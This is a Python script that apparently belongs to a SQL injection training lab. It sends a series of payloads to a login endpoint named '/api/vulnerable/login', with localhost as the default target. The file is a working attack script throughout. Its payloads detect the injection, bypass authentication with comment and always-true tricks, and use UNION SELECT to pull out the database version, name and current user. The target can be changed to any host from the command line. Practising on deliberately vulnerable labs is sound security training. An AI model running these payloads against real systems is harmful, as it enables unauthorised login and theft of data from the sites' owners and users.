#!/usr/bin/env python3
"""Phase 1: Error-Based SQL Injection - Database Fingerprinting"""

import requests
import json
import argparse
import sys


class Phase1ErrorBased:
    def __init__(self, target="http://localhost:5001", verbose=False):
        self.target = target
        self.verbose = verbose
        self.results = []

    def test_payload(self, name, payload):
        """Test a single payload"""
        try:
            data = {"username": payload, "password": "test"}
            response = requests.post(
                f"{self.target}/api/vulnerable/login",
                json=data,
                timeout=10
            )

            result = {
                "name": name,
                "payload": payload,
                "status": response.status_code
            }

            try:
                result["response"] = response.json()
                result["success"] = response.status_code == 200
            except:
                result["response"] = response.text[:200]
                result["success"] = False

            self.results.append(result)

            if result["success"]:
                print(f"  ✅ {name} - Status: {response.status_code}")
                if "sql" in result.get("response", {}):
                    print(f"      SQL: {result['response']['sql'][:80]}...")
            else:
                print(f"  ❌ {name} - Status: {response.status_code}")

            return result
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return None

    def run(self):
        print("\n" + "="*70)
        print("PHASE 1: ERROR-BASED SQL INJECTION")
        print("="*70)
        print(f"Target: {self.target}\n")

        tests = [
            ("🔍 Detect Vulnerability - True", "admin' AND 1=1 --"),
            ("🔍 Detect Vulnerability - False", "admin' AND 1=2 --"),
            ("🔓 Auth Bypass - Admin Comment", "admin' --"),
            ("🔓 Auth Bypass - Always True", "' OR '1'='1' --"),
            ("📊 Extract MySQL Version",
             "' UNION SELECT @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"),
            ("📊 Extract Database Name",
             "' UNION SELECT database(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"),
            ("📊 Extract Current User",
             "' UNION SELECT user(), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --"),
        ]

        for name, payload in tests:
            self.test_payload(name, payload)
            print()

        print("="*70)
        successful = [r for r in self.results if r.get("success")]
        print(f"✅ Phase 1 Complete: {len(successful)}/{len(tests)} successful")
        print("="*70)
        return self.results


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase1ErrorBased(target=args.target)
    phase.run()
